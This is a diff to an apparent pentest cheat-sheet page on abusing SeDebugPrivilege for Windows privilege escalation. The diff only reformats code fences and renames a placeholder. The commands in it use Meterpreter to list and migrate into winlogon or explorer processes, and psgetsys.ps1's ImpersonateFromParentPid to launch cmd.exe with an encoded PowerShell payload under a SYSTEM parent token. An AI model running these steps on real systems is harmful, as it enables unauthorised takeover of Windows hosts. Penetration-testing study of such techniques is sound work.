@@ -4,7 +4,6 @@ date: 2024-8-2
 tags: ["SeDebugPrivilege", "Windows", "potato", "privesc", "fullpower"]
 ---
 
----
 ### Tools
 
 {{< tab set1 tab1 active >}}Metasploit{{< /tab >}}
@@ -13,12 +12,12 @@ tags: ["SeDebugPrivilege", "Windows", "potato", "privesc", "fullpower"]
 
 <div>
 
-```bash
+```console
 # Inside meterpreter
 ps winlogon
 ```
 
-```bash
+```console
 # Explorer.exe is a good candidate
 migrate <PID>
 ```
@@ -30,13 +29,13 @@ migrate <PID>
 
 <div>
 
-```powershell
+```console
 # Import module
 . .\psgetsys.ps1
 ```
 
-```powershell
-ImpersonateFromParentPid -ppid <PID> -command "c:\windows\system32\cmd.exe" -cmdargs "/c <powershell #3 Base64>"
+```console
+ImpersonateFromParentPid -ppid <PID> -command "c:\windows\system32\cmd.exe" -cmdargs "/c <POWERSHELL_3_BASE64>"
 ```
 
 </div>
